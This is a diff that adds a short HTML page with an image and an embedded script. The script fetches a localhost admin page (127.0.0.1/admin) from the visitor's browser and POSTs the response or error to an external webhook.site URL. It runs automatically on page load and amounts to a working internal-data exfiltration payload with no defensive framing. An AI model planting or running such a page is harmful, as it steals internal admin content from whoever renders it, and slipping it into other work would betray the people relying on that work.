@@ -1,0 +1,29 @@
+<html>
+<body>
+<img src="https://unsplash.com/s/photos/random">
+<script>
+  // Helper function to transmit data to your server
+  function sendLog(payload) {
+    fetch('https://webhook.site/043d95c5-e4f3-4f37-b449-23633c4fc584', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+  }
+
+  fetch('http://127.0.0.1/admin')
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      return response.text();
+    })
+    .then(data => {
+      sendLog({ status: 'success', content: data });
+    })
+    .catch(error => {
+      // Captures network errors, blocked requests, or HTTP failure statuses
+      sendLog({ status: 'error', message: error.message });
+    });
+</script>
+</body>
